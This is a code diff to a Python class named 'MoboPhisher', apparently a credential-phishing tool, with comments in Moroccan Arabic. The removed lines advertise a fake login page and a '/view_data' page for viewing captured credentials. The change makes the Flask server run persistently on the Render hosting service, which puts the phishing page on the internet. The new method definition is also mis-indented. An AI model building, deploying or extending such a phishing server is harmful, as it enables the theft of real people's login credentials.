@@ -338,36 +338,17 @@ class MoboPhisher:
 </html>"""
             return html
 
-    def launch(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip_address = s.getsockname()[0]
-            s.close()
-            print("\n" + "="*50)
-            print(f"[+] Server running at: http://{ip_address}:8080")
-            print(f"[+] Alternative URL: http://mobo33:8080")
-            print("="*50)
-            print(f"[+] Login page: http://{ip_address}:8080")
-            print(f"[+] Credentials view: http://{ip_address}:8080/view_data")
-            print("\n[!] Share this URL with other devices on the same network")
-        except Exception as e:
-            print(f"\n[!] Network error: {e}")
-            print("[!] Using fallback URL: http://mobo33:8080")
-            ip_address = "mobo33"
+        def launch(self):
+        # قراءة البورت من متغيرات البيئة ديال Render
+        port = int(os.environ.get('PORT', 8080))
         
-        def run_server():
-            app.run(host='0.0.0.0', port=8080, threaded=True)
+        print("\n" + "="*50)
+        print(f"[+] Server starting on port {port}...")
+        print("="*50)
         
-        server_thread = Thread(target=run_server)
-        server_thread.daemon = True
-        server_thread.start()
-        
-        try:
-            input("\n[!] Press Enter to stop server...\n")
-        except:
-            pass
-        print("\n[!] Server stopped")
+        # تشغيل السيرفر مباشرة (بدون Thread وبدون input)
+        # هادشي كيخلي التطبيق يبقى خدام على Render
+        app.run(host='0.0.0.0', port=port, threaded=True)
 
 if __name__ == "__main__":
     phisher = MoboPhisher()
